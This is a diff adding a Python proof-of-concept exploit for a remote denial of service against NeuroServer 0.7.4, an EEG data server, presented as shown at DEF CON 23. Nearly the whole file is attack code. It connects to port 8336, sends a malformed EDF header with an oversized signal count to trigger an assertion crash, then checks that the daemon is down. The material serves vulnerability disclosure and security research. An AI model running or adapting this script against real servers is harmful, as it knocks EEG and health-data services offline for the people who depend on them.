@@ -1,0 +1,136 @@
+#!/usr/bin/env python
+#
+# NeuroServer 0.7.4 Remote DoS
+#
+# Shown at DEF CON 23 (BioHacking Village)
+# Brain Waves Surfing - (In)Security in EEG (Electroencephalography) Technologies
+# Slides: http://goo.gl/44r1HH
+#
+# NeuroServer is an EEG (Electroencephalography) TCP/IP Transceiver
+# http://openeeg.sourceforge.net/doc/sw/NeuroServer/
+#
+# Neuroserver mediates between the raw EEG devices and all the various EEG 
+# applications that the user may wish to run to analyse the incoming EEG data. 
+# Data is transmitted using TCP/IP, which means that the EEG data can just as 
+# easily pass over a network (or even the internet) as stay on the same machine. 
+# Standard EDF is used for header information and for file storage. 
+# The server is designed to run on Windows and Linux.
+# 
+#------------------------------------------------------------------------------
+#
+# nsd (NeuroServer Daemon) stops if any assertion is triggered inside isValidREDF() at
+# ~/NeuroServer-0.7.4/src/openedf.c:
+# ...
+#         assert(isValidREDF(result));
+# ...
+# int isValidREDF(const struct EDFDecodedConfig *cfg)
+# {
+#         int i;
+#         if (cfg->hdr.dataRecordSeconds != 1.0) {
+#                 setLastError("The data record must be exactly 1 second, not %f.",
+#                                                                  cfg->hdr.dataRecordSeconds);
+#                 return 0;
+#         }
+#         if (cfg->hdr.dataRecordChannels < 1) {
+#                 setLastError("The data record must have at least one channel.");
+#                 return 0;
+#         }
+#         if (cfg->chan[0].sampleCount < 1) {
+#                 setLastError("Channel 0 must have at least one sample.");
+#                 return 0;
+#         }
+#         for (i = 1; i < cfg->hdr.dataRecordChannels; ++i) {
+#                 if (cfg->chan[i].sampleCount != cfg->chan[0].sampleCount) {
+#                         setLastError("Channel %d has %d samples, but channel 0 has %d.  These must be the same.", cfg->chan[i].sampleCount, cfg->chan[0].sampleCount);
+#                         return 0;
+#                 }
+#         }
+#         return 1;
+# }
+#
+
+import socket
+import time
+import sys
+
+# Malformed EDF header
+# Spec: http://www.edfplus.info/specs/edf.html
+EDF  = "0       " # Version
+EDF += "Alejandro Hernandez                                                             " # Patient Identification
+EDF += "NeuroSky MindWave                                                               " # Recording Identification
+EDF += "07.04.1520.55.28768     EDF+C                                       "             # Startdate of Recording
+EDF += "29      " # Number of Data Records
+EDF += "1       " # Duration of a Data Record in Seconds
+EDF += "1337    " # Number of Signals. This value triggers the DoS: assert(cfg->hdr.dataRecordChannels < MAXCHANNELS);
+EDF += "Electrode       EDF Annotations                                                                                                                                                                                 "      # Labels and other data per channel
+EDF += "-32768  -1      32767   1       -32768  -32768  32767   32767   " # PhysiMin PhysiMax DigiMin DigiMax
+
+if len(sys.argv) != 2:
+	print 'Usage: ' + __file__ + ' <NeuroServer IP>'
+	sys.exit(1)
+
+print r'''
+                           __,--"""""""""--,.
+                     _ -\'"                  _\ ^-,_
+                  ,-"                     _/        \_
+                 ,                    /    \          \
+               ,'                    /_    |           \
+              /           _____,--"""     /         )   \
+             /           /               /         (     |
+            |          /                /      )         |
+            |         /  NeuroServer 0.7.4 Remote DoS     \
+            (     (_/\      )                 /            \
+             \        \_          ____,===="""    /        |
+              \                /"                /""       |
+               \_          _,-" |___,-'--------'"          |
+                 "`------""   --"                 ,-'      /
+                        /                     ---"        /
+                        \___/          __,-----,___       )
+                            \     ,--'"============""""-'"
+                             "-'" |  |=================/
+                                  /___\===============/
+                                   /  |=============/"
+                                   \   \_________,-"
+                                   |   |
+                                   |   |
+'''
+
+neuroserver = (sys.argv[1], 8336)
+
+s = socket.socket()
+
+print '|- Connecting to %s on port %s\n' % neuroserver
+try:
+	s.connect(neuroserver)
+except Exception, e:
+	print '|- Can\'t connect to %s:%d' % neuroserver
+	print '|- Exception: %s' % (e)
+	sys.exit(1)
+
+print '|- Entering in EEG role. NeuroServers\' response:'
+s.send('eeg\n') # EEG role in NeuroServer
+print '----------------------------------------------'
+print s.recv(16).strip('\n')
+print '----------------------------------------------'
+
+print '|- Sending Malformed EDF header (%d bytes):' % len(EDF)
+print '----------------------------------------------'
+print EDF
+print '----------------------------------------------\n'
+s.send('setheader ' + EDF + '\n')
+
+time.sleep(4)
+
+print '|- NeuroServer should be dead now. Connecting...\n'
+try:
+	s = socket.socket()
+	s.connect(neuroserver)
+except Exception, e:
+	print '|- NeuroServer is down !'
+	print '|- Exception: %s' % (e)
+else:
+	print '|- NeuroServer is still alive :-\, try again...'
+finally:
+	s.close()
+
+sys.exit(0);
